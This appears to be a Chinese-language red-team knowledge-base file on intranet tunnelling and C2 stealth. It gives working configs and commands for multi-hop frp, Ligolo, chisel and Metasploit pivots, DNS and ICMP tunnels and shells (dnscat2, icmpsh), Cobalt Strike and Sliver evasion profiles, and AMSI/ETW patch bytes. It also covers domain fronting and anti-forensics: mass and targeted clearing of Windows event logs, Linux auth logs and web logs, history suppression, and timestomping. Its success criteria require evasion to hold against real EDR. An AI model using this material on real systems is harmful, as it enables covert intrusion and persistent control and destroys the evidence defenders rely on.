---
name: kb-tunnel-c2-stealth
description: 内网隧道与C2隐蔽专题纵深手册——多级代理链(frp级联/Ligolo多跳/MSF多级路由/chisel多级/proxychains)、隐蔽隧道细节(DNS/ICMP/HTTP-SSH)、C2上线与隐蔽(vshell/CS4.x/Sliver/Mythic)、检测规避(EDR/AMSI-ETW/流量/日志清理)、常见坑与绕过。2024-2026情报已查证
tags: [隧道, C2, 隐蔽, 多级代理, EDR规避, 日志清理, 检测对抗]
date: 2026-08-14
---

# 内网隧道与 C2 隐蔽专题纵深手册

> 定位：与 `kb_intranet_lateral_domain_2026.md`（隧道工具**概览**）互补，本文做**纵向纵深**——多级代理链、隐蔽隧道协议细节、C2 上线隐蔽、检测规避与日志清理。选型三问：①目标能出什么协议(TCP/HTTP/DNS/ICMP)？②穿几层(单跳/双跳/多跳)？③隐蔽等级(可用 vs 对抗EDR)？答案决定下文章节。

---

## 〇、适用场景对比表

| 工具 | 协议 | 级别 | 典型场景 | 隐蔽性 | 吞吐 | 备注 |
|------|------|------|---------|--------|------|------|
| frp | TCP(stcp/xtcp) | L2 | 通用反向代理/内网穿透 | 中(TLS可开) | 高 | 级联多跳易配 |
| Ligolo-ng | 反向TCP+TLS→TUN | L3 | 内网多段互不可达 | 中高 | 高 | 免SOCKS,nmap直打 |
| chisel | TCP/HTTP(S) | L5 | 无SSH环境打洞 | 中 | 中高 | reverse模式最常用 |
| Suo5 | HTTP(S) chunked | L5/WebShell | 只开80/443的Web主机 | 高 | 高(近frp) | 全双工单请求 |
| Neo-reGeorg | HTTP(S) 轮询 | L5/WebShell | 兼容性优先的WebShell隧道 | 低 | 低 | 慢,适合短流量 |
| iodine | DNS(A记录) | L3 | 只放行DNS出网 | 中 | 中(≈1Mbps) | 需root/TUN |
| dnscat2/dns2tcp | DNS(TXT/A) | L5 | 只放行DNS,要加密C2/轻量TCP | 中高/低 | 低 | 加密+多会话 / 配置简单 |
| pingtunnel/icmpsh | ICMP | L3/L5 | 只放行ping | 中 | 中低/低 | 需libpcap / Win-only无认证 |
| SSH | TCP(mux) | L5 | 有SSH凭据/服务 | 高(加密) | 高 | -L/-R/-D/Jump |
| MSF | 会话内 | L5 | 已有Meterpreter | 中 | 中 | autoroute+socks4a |

---

## 一、多级代理链（双跳/多跳穿网段）

### 1.1 frp 级联（含 stcp/xtcp 细节）

**经典双跳**：VPS(frps) ← 边界机A(frpc+socks5) → A 上再跑 frps2 ← 深网B(frpc2+socks5)。A 需能访问深网且能被 B 访问。

```toml
# ===== 第一层：VPS <your-attack-server> 的 frps.toml =====
bindPort = 7000                # frp 通信端口
auth.method = "token"
auth.token = "frp-key-1"       # 一级密钥
transport.tls.force = true     # 只接受 TLS 连接(加密+抗嗅探)
webServer.addr = "0.0.0.0"
webServer.port = 7500          # 管理面板
webServer.user = "admin"
webServer.password = "强口令"
```
```toml
# ===== 边界机 A(frpc1.toml)：既提供一级socks，又把内网frps2映射出来 =====
serverAddr = "<your-attack-server>"
serverPort = 7000
auth.method = "token"
auth.token = "frp-key-1"

[[proxies]]                    # 一级 SOCKS5 出口(攻击机直连)
name = "s1"
type = "tcp"
localIP = "127.0.0.1"
localPort = 1080
remotePort = 1080
[proxies.transport]
useEncryption = true           # 载荷加密
useCompression = true

[[proxies]]                    # 关键：把 A 上监听的二级 frps 端口透传出去
name = "relay2"                # 让 B 能连到 A:7001 上跑的内网 frps2
type = "tcp"
localIP = "127.0.0.1"
localPort = 7001
remotePort = 7001
```
```toml
# ===== 深网机 B(frpc2.toml)：连 A 的内网 frps2(即 7001) =====
serverAddr = "<A的内网IP>"      # B 能直达 A 的内网地址
serverPort = 7001
auth.method = "token"
auth.token = "frp-key-2"       # 二级密钥
[[proxies]]
name = "s2"
type = "tcp"
localIP = "127.0.0.1"
localPort = 1081
remotePort = 1081
[proxies.transport]
useEncryption = true
```
```text
proxychains 多级写法(见 §1.5)：
socks5 127.0.0.1 1080   # 走一级
socks5 127.0.0.1 1081   # 走二级(需把 1081 从 VPS 反代回来，或本地二次连接)
```

**stcp / xtcp 要点**（无需在 frps 暴露目标端口）：
- **stcp**：被访问方 frpc 建 `type="stcp"` + `secretKey`；访问方 frpc 建 `type="stcp"` 的 `[[visitors]]`，`serverName=对方代理名`，本地 `bindPort` 即访问口。流量经 frps 中转。
- **xtcp**：P2P UDP 打洞直连，大流量/远程桌面首选；打洞失败**必须回退 stcp**(官方推荐内网同放 stcp 兜底，0.52+ 支持 `[[proxies]]` 级 `fallbackTo="stcp同名"`)。**坑**：xtcp 对对称型 NAT 打洞难；UDP 被拦必须回退。

### 1.2 Ligolo-ng 多跳（免 SOCKS，nmap 直打）

```bash
# 攻击机(Kali)：
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert                          # 自签证书(实战对目标用 -ignore-cert)
# 边界机 A(目标)：
./agent -connect <攻击机IP>:11601 -ignore-cert
# proxy 控制台：session 选 A → ifconfig 看 A 网卡 → 
sudo ip route add 172.16.1.0/24 dev ligolo  # 加路由
# 控制台 start 开始隧道
```

**双跳**(B 不能直达攻击机，但能达 A)：
```text
# A 上(proxy 控制台 listener_add)：让 A 监听 4444 转发到 proxy 的 11601
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601
# B 上：连 A 的中转口而不是攻击机
./agent --connect <A内网IP>:4444 -ignore-cert
# proxy 控制台切到 B 会话 → ifconfig → 再加路由 192.168.50.0/24 dev ligolo → start 三跳达成
```
- 反连/端口转发：`listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp`；SOCKS5 出网：`./agent --socks 192.168.1.1:1080 [--socks-user u --socks-pass p]`
- **坑**：Windows 目标需装 wintun 驱动；多 TUN 时每个网段单独 `ip route add`；`tunnel_stop` 选择性断某 agent 隧道。

### 1.3 MSF 多级路由（已有 Meterpreter 场景）

```text
# 一级路由：会话1 上加路由 + 开 socks4a
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0            # A 能到的深网段
run
# 或 meterpreter 内：run autoroute -s 172.16.5.0/23 ; run autoroute -p

use auxiliary/server/socks_proxy # 新版替代已废弃的 socks4a
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```
```bash
# 攻入 B 后(无反向通道)，用 proxychains 回连生成 bind payload 打第二跳
proxychains msfvenom -p linux/x64/meterpreter/bind_tcp lport=3333 -f elf -o t2.elf
proxychains msfconsole          # 会话2 → run get_local_subnets → 再 autoroute 第三段
```
- 端口转发：`portfwd add -l 3300 -p 3389 -r 172.16.5.19`；反向 `portfwd add -R -l 8081 -p 1234 -L <攻击机IP>`。**坑**：autoroute 只能传 TCP；nmap 必须 `-sT -Pn`；深网 B 无外连时必须用 bind，别硬等 reverse。

### 1.4 chisel 多级（无 SSH 环境通用）

```bash
# 一级(攻击机)：reverse 服务端
./chisel server --port 8080 --reverse
# 边界机 A：反向连回，把 socks 开在攻击机 1080
./chisel client <攻击机IP>:8080 R:socks

# 二级(在 A 上再起一段)：A 上开一个正向 server 给 B 连
./chisel server --port 8081 --socks5     # A 上
./chisel client <A内网IP>:8081 R:socks   # B 上
```
- 结果：攻击机 1080 = 一级 socks；B 段需再映射 1081 回传。chisel 优势是**单二进制跨平台、默认加密**（加 `--key` 自定义密钥）。**坑**：reverse 模式 socks 只能从服务端本地用；中间机需同时 client+server；`--keepalive` 设短值防 NAT 超时踢连接。

### 1.5 proxychains-ng 配置与常见坑

```text
# /etc/proxychains.conf（或 proxychains4.conf）核心段：
strict_chain            # 按序全用；任一挂则失败(排查期改 dynamic_chain)
[ProxyList]
socks5 127.0.0.1 1080   # 第一跳
socks5 127.0.0.1 1081   # 第二跳(深网)
proxy_dns               # 让 DNS 也走代理链，防内网域名解析不了/DNS泄漏
```
| 坑 | 现象 | 解法 |
|----|------|------|
| DNS 泄漏 | 内网域名解析失败/本地DNS先出网 | 开 `proxy_dns`；或手动解析后直用 IP、写 /etc/hosts |
| strict_chain 单点故障 | 一跳断整链挂 | 改 `dynamic_chain` 或修那一跳 |
| nmap SYN 扫不了 | 只支持 TCP connect | 一律 `proxychains nmap -sT -Pn` |
| UDP 工具走不了 | socks5 上 UDP 要远端支持 | 换 frp/Ligolo 隧道承载 UDP，或干脆不用 |
| 大流量超时 | 隧道慢+代理队列满 | 拆小并发(`-p 1`)、加 `timeout`、避免全端口扫 |
| 与 MSF socks 端口冲突 | 连上但无响应 | 确认 socks_proxy version=4a 与客户端 4a/5 匹配 |

---

## 二、隐蔽隧道深度

### 2.1 DNS 隧道（只放行 53 出网的最后一根稻草）

**前提**：你有自己的域名，并把 NS 记录指向你的服务器（VPS 开 53 监听）。三工具对比：

| 工具 | 记录类型 | 加密 | 模式 | 适用 | 吞吐 |
|------|---------|------|------|------|------|
| iodine | A | 口令弱加密 | IP over DNS(TUN) | 想跑完整 TCP/IP | ≈1Mbps |
| dnscat2 | TXT/MX/CNAME/A | 预共享密钥加密 | 会话式 C2 | 交互 shell/多会话 | 低 |
| dns2tcp | A | 无 | TCP over DNS | 单条 TCP 转发 | 低 |

```bash
# iodine：服务器(root 起 TUN)
iodined -f -c -P tunnelpass 10.0.0.1 tunnel.example.com
# 客户端：-f 前台；-r 跳过改默认路由；-4 优先IPv4 DNS；-d 指定上游DNS
sudo iodine -f -P tunnelpass -r tunnel.example.com
# 通后：ping 10.0.0.1 验证；ssh -o ProxyCommand="nc %h %p" 10.0.0.2 即可用内网
```
```bash
# dnscat2：服务器
ruby dnscat2.rb tunnel.example.com --dns "domain=tunnel.example.com,host=<VPS公网IP>" --no-cache --secret s3cret
# 客户端(Windows)：dnscat2-v0.07-client-win32.exe tunnel.example.com --secret s3cret
# 进 dnscat2> 后：session -i 1 交互 / window -i 交互shell / exec 执行命令
```
```bash
# dns2tcp：服务器
cat > /etc/dns2tcpd.conf <<'EOF'
listen = 0.0.0.0:53
domain = tunnel.example.com
key = d2tpass
ressource = "ssh:127.0.0.1:22"
ressource = "socks:127.0.0.1:1080"
EOF
dns2tcpd -f /etc/dns2tcpd.conf -F
# 客户端：
dns2tcp -z tunnel.example.com -r ssh -k d2tpass --dns-server <VPS> localhost:2222
```
**检测规避要点**：压低 QPS(越低越难被统计规则抓)；子域标签 ≤ 20 字符、熵别太高(贴合正常分布)；**iodine 用 A 记录天然躲过只查 TXT 的规则**；别全速长拉(吞吐波动是 2024 检测特征)、混真实 DNS；dnscat2 加 `--secret` 避免明文 payload。

### 2.2 ICMP 隧道（只放行 ping）

```bash
# pingtunnel(转发 TCP/UDP/SOCKS5 进 ICMP)
# 服务器(VPS)：
./pingtunnel -type server
# 客户端(内网机，需 libpcap/WinPcap)：
./pingtunnel -type client -l 127.0.0.1:1080 -s <VPS> -t <VPS>:8888 -x she -c 192.168.1.1
# 之后 proxychains socks5 127.0.0.1 1080 走内网；-x 为共享口令
```
```bash
# icmpsh(极简反连 shell，Windows-only 客户端)
# 攻击机：
sysctl -w net.ipv4.icmp_echo_ignore_all=1    # 关本机应答，避免和隧道抢 echo reply
python2 icmpsh_m.py <攻击机IP> <目标IP>
# 目标机：
icmpsh.exe -t <攻击机IP> -d 500 -b 32         # -d 延迟ms -b 包大小上限
```
- **坑**：pingtunnel 必须 root + libpcap；Windows 下 pcap 安装麻烦可改用 icmpsh；icmpsh 无认证且 Python2，仅作临时通道。**检测规避**：ICMP payload >16 字节、高频率大包是经典特征——控制发包频率、payload 填充随机内容。

### 2.3 HTTP(S) 隧道 WebShell 场景（Neo-reGeorg vs Suo5）

| 对比项 | Suo5 | Neo-reGeorg |
|--------|------|-------------|
| 原理 | HTTP/1.1 双向 chunked，单请求长连接 | 大量短请求轮询 |
| 性能 | 号称数十倍于 neo，近 frp | 低，适合短流量 |
| 全双工 | 支持(反向代理环境降半双工) | 不支持 |
| 兼容/选型 | Java4-21/IIS .NET2.0+，Java 站优先求速度 | 更宽更灵活，兼容性优先 |
| 加密 | 每包 XOR(密钥在载荷第5字节，前4字节为长度) | 无内建 |

```bash
# Suo5：攻击机起监听(输出 socks5)
suo5 -l 0.0.0.0:1081 -S
# 目标上传 suo5.jsp，URL 形如 http://target/suo5.jsp?key=xxx
# 流量细节：全双工 Content-Type=application/octet-stream；半双工=application/x-binary
# 测试包=application/plain 固定64字节；响应加 X-Accel-Buffering: no 关缓冲
# 反向代理/负载均衡场景：--redirect http://上游IP:端口 绕过LB固定后端
```
```bash
# Neo-reGeorg：生成隧道脚本 → 上传 → 本地起 socks
python neoreg.py generate -k password tunnel.jsp
python neoreg.py -k password -u http://target/tunnel.jsp -p 1080
# 之后 proxychains socks5 127.0.0.1 1080
```
- **坑**：全双工 chunked 在 Nginx 反代/WAF 下不可用→Suo5 自动或手动降半双工；WAF 盯 `Transfer-Encoding: chunked` 时换 `--classic` 短轮询模式；Neo-reGeorg 慢——大批量扫描别走它。

### 2.4 SSH 隧道多场景

```bash
# -L 本地转发：把远端内网 3389 映射到本地 13389
ssh -N -L 13389:192.168.1.10:3389 user@jump
# -R 远程转发：把本地 80 暴露到 VPS 的 8080（外连回内网）
ssh -N -R 8080:127.0.0.1:80 user@vps
# -D 动态 SOCKS5
ssh -N -D 1080 user@jump
# ProxyJump 多跳链(一台接一台)
ssh -J user@jump1,user@jump2 user@target
```
```bash
# ~/.ssh/config 持久化多跳
Host jump2
  HostName 172.16.5.1
  User root
  ProxyJump jump1                # 经 jump1 中转
Host target
  HostName 192.168.50.20
  ProxyJump jump2
# 用法：ssh -N -D 1080 target  # 一条命令起多跳 socks
```
- **坑**：`-N` 只建隧道不执行命令，防终端挂住；SSH 默认 22 容易被扫，改高位端口或用 `-o Port`；**用密钥免密+禁用口令**防爆破；ControlMaster 复用连接提速；隧道断链用 autossh 守护。

---

## 三、C2 上线与隐蔽

### 3.1 vshell（Go 轻量 C2，打点/建隧优先）

```bash
# 部署：上传到 VPS，启动后浏览器 http://<IP>:8082
./vshell_linux_amd64
# 默认 admin/admin，务必改；conf/setting.conf 里改 web 端口/通信密钥(VKey)/口令，开 web_basic_auth 防测绘收录
```
- **监听方式**：TCP / KCP(UDP) / WebSocket / DNS / DOH / DOT / OSS——默认 8084。
- **反向客户端类型**：Stage / Shellcode / Stageless / DLL 反连；另有正向监听 + Linux eBPF(穿透防火墙)。**隐蔽要点**：内置 VKey 双向认证 + 盐值加密；SSL 证书伪装、CDN 隐藏、域名上线；插件内存加载(exe/.net/elf/dll/so/dylib)。
- **流量特征(检测视角，规避=改默认)**：TCP 首包 6 字节标识 `l64`/`w64`(Linux/Windows64) + 34 字节 IP 声明包；WebSocket 握手 GET `/?a=l64&h=<serverIP>&t=ws_&p=8088`——会暴露架构/C2地址/协议/端口，**务必改默认端口、伪装路径、加 CDN**。

### 3.2 Cobalt Strike 4.x（Malleable C2 + sleep mask 要点）

```text
# malleable C2 profile 核心段(示例：模拟浏览器 GET/POST)
http-get {
    set uri "/search?q=";
    client { metadata { base64; header "Accept" "text/html"; } }   # 请求体变换
    server { header "Content-Type" "text/html"; }                   # 响应伪装
}
http-post {
    set uri "/submit.php";
    client { id { base64url; header "Cookie" "session="; } }        # beacon id 藏 cookie
}
sleep 60; jitter 20;                                               # 60s±20% 抖动
useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...";          # 自定义 UA(默认UA是特征)
```
- **Beacon 侧隐蔽**：`set sleepmask "true";`(4.11 默认开)——睡眠加密 Beacon 内存与堆记录，自定义 Sleep Mask BOF 还能伪造 `msedge.exe` 调用栈。**stage 混淆(4.11)**：`transform-obfuscate { lznt1; rc4 "64"; xor "32"; base64; }`(Blister 式多层)；UDRL(自定义反射加载器)是 2024 官方建议的对抗起点。
- **注入规避**：Process Injection Kit 改 `NtMapViewOfSection`(WD/Elastic 可绕)，默认注入 `msedge.exe`；PPID spoof + 命令行伪装。**流量层**：HTTPS listener + 自定义证书(默认 CS 证书指纹已入黑名单)；域名前置(见 §4.2)；Beacon 模式(异步+抖动 OPSEC 更高)。

### 3.3 Sliver（开源 Go C2，默认 mTLS）

```text
# mTLS(最稳默认)：mtls --lport 8443
generate beacon --mtls <IP>:8443 --os windows --arch amd64 --seconds 60 --jitter 30
# WireGuard(横移最 OPSEC 友好，TUN 网卡可跑标准 TCP/IP)：wg --lport 51820 --nport 8888
generate --wg <IP>:51820 --os windows
# HTTP(S)/DNS 同样支持；beacons 看异步任务，sessions 看交互会话
```
- **坑（2024 已知指纹）**：Sliver 默认 Go TLS 栈有**公开的 JA3/JARM 指纹**（Shodan 直接可猎），需随机化 cipher suite 改 JARM + TLS mimicry profile 双管齐下才压得住；Go 二进制 3-15MB、内存含 Go 字符串也是 IOC。

### 3.4 Mythic（模块化，无明显框架指纹）

- 组件：teamserver + Web UI + 按平台选 agent（Apollo=C#/Athena/Poseidon/Thanatos）。
- **OPSEC 优势**：框架级无稳定指纹，检测必须逐 agent+profile 刻画(2025 Kaspersky 只能描述单一配置)；默认支持域前置、加密信道。**注意**：任务小而频繁形成"心跳"beacon 特征；离线/气隙可跑(本地 PostgreSQL)。

### 3.5 进程注入 / 内存执行通用手法

| 手法 | 做法 | 对抗点 |
|------|------|--------|
| 进程镂空 Hollowing | 起合法进程(notepad)→卸载镜像→写 shellcode→远程线程 | 会被 EDR 扫内存/查父进程 |
| **模块踩踏 Module Stomping** | 用合法 DLL(如 amsi.dll).text 段覆写 shellcode 执行 | 比镂空隐蔽，扫描看到的是已加载合法模块 |
| NtMapViewOfSection 注入 | 用 section 对象映射替代 WriteProcessMemory | 躲过 R/W 告警 |
| DLL 脱钩 Unhooking | 从磁盘重载 ntdll 覆写被 hook 的 .text | 恢复被 EDR hook 的原生 API |
| BOF | C 编译对象内存执行，不落地文件 | 只留内存，无文件痕迹 |
| PPID 伪装 | CreateProcess 指定父 PID 为合法进程 | 隐藏进程树血缘 |
- **内存属性铁律**：避免 RWX 三段内存（EDR 高频告警）；先 RX 执行再改 RW，或让 Sleep Mask 睡眠期清空可执行内存。

---

## 四、检测规避

### 4.1 进程/内存层（AMSI/ETW patch）

```text
# 传统 AMSI patch：改写 AmsiScanBuffer 开头(x64: 48 83 EC 28 -> B8 57 00 07 80 C3 或 E9 跳转)
# ETW patch：改写 ntdll!EtwEventWrite 开头为 xor eax,eax; ret (0x33 0xC0 0xC3)
```
- **2024 趋势——别只打补丁**：EDR 已盯 `VirtualProtect` 改 amsi.dll 行为。更优：**Patchless 硬件断点**(LightsOut/RustPatchlessCLRLoader 用 DR0-DR3，不碰 VirtualProtect、不改文件)；**反射方法替换**(TrollAMSI 重定向 ScanContent，零 P/Invoke)；**Killer 式**(NT API 直接 patch EtwEventWrite 首字节 0xC3)。
- **执行层规避**：DLL 脱钩 → Heaven's Gate(32位进程调64位 API) → 睡眠混淆(Ekko/Foliage 加密睡眠段)。

### 4.2 流量层规避

| 手法 | 细节 | 对抗点 |
|------|------|--------|
| 自定义 TLS 证书 | 别用 CS/MSF 默认证书(已入黑名单)；自签+预置信任 | 证书指纹识别 |
| 改 JA3/JARM | 随机化 cipher suite/扩展顺序改 Go 栈指纹 | Shodan 式 JARM 猎杀 |
| Malleable 流量伪装 | 仿浏览器 UA/Header/URI 分布/请求体编码 | 特征匹配 |
| 抖动+Beacon | sleep 60±30s、上传下载区分 transform | 周期心跳检测 |
| **域前置 Domain Fronting** | 见下 | SNI/Host 不匹配检测 |
| 云函数/CDN 中转 | 阿里云 DCDN 等回源隐藏真 C2 | 资产测绘溯源 |

```text
# 域前置核心：TLS SNI 用高信誉域名，真正目标只放 HTTP Host
curl https://www.cloudflare-ok.com -H "Host: real-c2.example.com"
# 现状(2024-2026)：Cloudflare/CloudFront/Google 已禁用；国内阿里云仍可复现。
# 反检测：SNI≠Host 是 MITRE DET0196 头号检测点——要么 SNI/Host 一致只做 CDN 隐藏真IP，要么选开放 CDN+流量特征伪装。
```
- **判定铁律**：单靠 CDN/域前置不算隐蔽，必须**证书+UA+profile+抖动**四件套一起才谈得上对抗检测。

### 4.3 日志清理（Windows / Linux / Web）

```powershell
# Windows 事件日志
wevtutil cl Security; wevtutil cl System; wevtutil cl Application   # 全清(动静大)
wevtutil cl "Windows PowerShell"; wevtutil cl "Microsoft-Windows-Sysmon/Operational"
# 定向删某条：EvtxEdit / Log Parser 精确删，别整库清(SIEM 看"日志空洞"即告警)
# 停事件服务级工具：Invoke-Phant0m(杀掉 svchost 里的 eventlog 线程，之后无新日志)
Get-WinEvent -ListLog * -Force | Where-Object {$_.RecordCount} | ForEach-Object { wevtutil cl $_.LogName }
# 痕迹文件：Prefetch/Amcache/Recent/JumpList 一并清；timestomp 改 MACE 时间
```
```bash
# Linux：先抑制本会话记录，再做定向删除
unset HISTFILE; export HISTSIZE=0; export HISTCONTROL=ignoreboth   # 前缀空格命令不记历史
history -c; echo > ~/.bash_history
# 定向删自己的行(别 rm -rf /var/log/*，直接亮红灯)
sed -i '/<本机IP>/d' /var/log/secure /var/log/auth.log
sed -i '/<时间窗>/d' /var/log/wtmp /var/log/btmp /var/log/lastlog 2>/dev/null
# 免登录痕迹的 SSH：ssh -T user@host /bin/bash -i  (不写 wtmp)
# 改时间戳：touch -d '2026-08-01 03:04:05' file ; 抹除文件：shred -f -u -z -n 8 file
```
```bash
# Web 日志定向删自身 IP(tomcat/nginx/apache)
sed -i '/<我的出口IP>/d' /usr/local/tomcat/logs/localhost_access_log.*.txt
sed -i '/<我的出口IP>/d' /var/log/nginx/access.log /var/log/httpd/access_log
```
- **判定门槛**：删完用 `wevtutil qe Security` / `last -a` / 查看对应日志文件确认目标条目消失且服务正常；**整库清空=不打自招**，优先"删自己那几条"。

---

## 五、常见坑与绕过速查

| 类别 | 现象 | 绕过 |
|------|------|------|
| 稳定性 | 隧道频繁断/卡 | frp `transport.heartbeatInterval/Timeout`；chisel `--keepalive` 短值；SSH 用 autossh；隧道出口加 keep-alive |
| 带宽 | DNS/ICMP 通道慢 | 只走控制/小数据，批量传输换 TCP 通道或分块压缩 |
| 出网策略 | 只放 80/443 | Suo5 半双工 / Neo-reGeorg / HTTPS 隧道；ICMP 只放 ping → icmpsh |
| UDP 被拦 | xtcp/WireGuard 不通 | stcp/TCP 兜底；改 KCP over UDP 也有风险，优先 TCP |
| 加密缺失 | DNS/ICMP 明文载荷 | dnscat2 `--secret`；iodine `-P`；pingtunnel `-x`；HTTP 隧道自带 XOR/走 TLS |
| 指纹暴露 | UA/JA3/证书/默认端口 | 全换自定义：UA 抄浏览器、证书自签+预置、端口走高段伪装、profile 仿业务 |
| proxychains | DNS 泄漏/单点挂 | `proxy_dns` + `dynamic_chain`(排查期)；nmap 只 `-sT -Pn` |
| 隧道/C2 判定 | 无法确认通没通 / beacon 不回 | 穿透后 `curl http://内网IP/` + 深网机 `nc` 回连双重验证；beacon 检查监听/防火墙/CDN 回源、jitter 别设 0、先用 mTLS 直连排除 profile |
| 痕迹确认 | 删了日志仍被溯源 | 查 DNS 缓存(ipconfig /displaydns)、Prefetch、USN 日志、浏览器历史是否留痕，一并处理 |

---

## 判定门槛（什么才算"成功"）

1. **多级隧道**：攻击机经链条发出请求，深网服务响应，双向数据包在中间节点被验证转发过(`curl -v` + 中间机 tcpdump 同时抓到)；**隐蔽隧道**：目标协议(如 DNS)解析到数据且能承载命令/文件，加密已启用(无明文 payload)。
3. **C2 上线**：beacon 完成周期 check-in，任务在目标执行有回显；非默认特征（UA/证书/端口/profile）已替换。
4. **检测规避**：在真实 EDR/AV 环境实测未拦；日志清理后事件查看器/`last`/日志文件确认目标条目消失。
> 未满足上述实证前，一律按"通道已建立但未验证成功"处理，不得直接写"隧道打通/C2 已隐蔽"。

---

## Sources

- frp：[官方 Releases](https://github.com/fatedier/frp/releases)、[STCP/XTCP 部署](https://hsj01.github.io/posts/myblog45/)、[配置详解](https://www.gm7.org/archives/93685)
- Ligolo-ng：[官方双跳](https://docs.ligolo.ng/sample/double/)、[Hacking Articles](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/)、[OSCP 笔记](https://github.com/dollarboysushil/oscp-cpts-notes/blob/main/pivoting-and-tunneling/ligolo-ng.md)
- MSF：[Hacknetics msf-tunneling](https://github.com/ice-wzl/Hacknetics/blob/main/c2-frameworks/metasploit/msf-tunneling.md)、[内网穿透笔记](https://0x00dream.github.io/2024/11/21/nei-wang-shen-tou/nei-wang-chuan-tou/)
- Suo5：[官方 README](https://github.com/MorvenCat/suo5)、[CN-SEC 说明](https://cn-sec.com/archives/1716829.html)、[观成流量分析](https://www.yuque.com/jianouzuihuai/attack-defense/xcmff1dxqsznlxec)
- DNS/ICMP 隧道：[DNS 隧道技术](https://blog.csdn.net/qq_44005305/article/details/132010852)、[CS DNS 隧道+DLP 检测](https://rivers.chaitin.cn/blog/cq9498p0lnechd242p7g)、[icmpsh/PingTunnel](https://blog.csdn.net/2401_84971057/article/details/138793958)
- Cobalt Strike 4.x：[4.11 sleep mask](https://www.cobaltstrike.com/blog/cobalt-strike-411-shh-beacon-is-sleeping)、[BeaconGate 定制](https://rwxstoned.github.io/2024-11-13-Cobalt-Strike-customization/)、[UDRL Part3](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data)
- Sliver/Mythic：[Sliver 通信协议](https://deepwiki.com/BishopFox/sliver/6-communication-protocols)、[C2 框架对比](https://ringsafe.in/academy-c2-frameworks/)
- 规避/清理：[LightsOut](https://github.com/icyguider/LightsOut)、[SharpBlock](https://github.com/deltaRed1a/SharpBlock)、[EDR Roadmap](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/)、[反取证清单](https://github.com/JoasASantos/Anti-Forensic-Techniques)、[痕迹清理](https://cloud.tencent.com.cn/developer/article/2396399)
- 域前置/CDN：[MITRE DET0196](https://attack.mitre.org/detectionstrategies/DET0196/)、[CDN 域前置测绘(WWW'24)](https://rivers.chaitin.cn/blog/cq94jj90lnechd243hj0)、[vshell 流量分析](https://www.sohu.com/a/895059485_121080362)、[proxychains](https://x3ric.com/blog/posts/Chisel/)
